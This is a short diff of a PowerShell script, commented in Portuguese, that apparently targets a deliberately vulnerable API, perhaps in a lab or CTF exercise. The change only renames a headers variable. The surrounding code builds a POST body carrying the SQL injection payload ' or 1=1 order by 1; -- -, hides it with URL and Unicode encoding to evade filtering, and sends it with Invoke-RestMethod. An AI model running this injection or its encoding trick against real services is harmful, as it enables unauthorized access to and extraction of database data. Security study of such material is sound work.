@@ -63,7 +63,7 @@ function Set-UnicodeEncode {
 }
 
 # OPCIONAL: Cabeçalho da requisição
-$headers = @{
+$headerRequest = @{
     "Accept"            = "*/*"
     "Accept-Encoding"   = "gzip, deflate"
     "Accept-Language"   = "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3"
@@ -81,7 +81,7 @@ $querySQL = ''' or 1=1 order by 1; -- -'
 $bodyRequest = "data=$(Set-URLEncode -String_Input '{"name":"new hacker","nick":"tamper ')$(Set-UnicodeEncode -String_Input $querySQL)""}"
 
 # Requisição POST na API vulnerável
-$webRequest = Invoke-RestMethod -Uri "$($server)$($api)" -Method Post -Headers $headers -Body $bodyRequest
+$webRequest = Invoke-RestMethod -Uri "$($server)$($api)" -Method Post -Headers $headerRequest -Body $bodyRequest
 
 # Resposta da requisição
 $webRequest.hacker
